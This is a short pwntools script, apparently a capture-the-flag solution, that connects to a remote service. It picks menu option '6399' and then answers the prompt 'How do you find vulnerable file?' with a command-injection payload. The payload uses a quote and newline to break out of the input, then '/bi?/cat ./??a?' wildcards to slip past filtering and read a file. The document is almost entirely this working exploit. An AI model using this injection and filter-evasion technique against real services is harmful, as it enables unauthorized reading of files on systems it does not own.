from pwn import *                                                               

p = remote('110.10.147.106', 15959 )
#p = process('./20000')
payload = "\"\n/bi?/cat ./??a?"
p.recv()
p.sendline('6399')
p.sendlineafter('How do you find vulnerable file?', payload)

p.interactive()
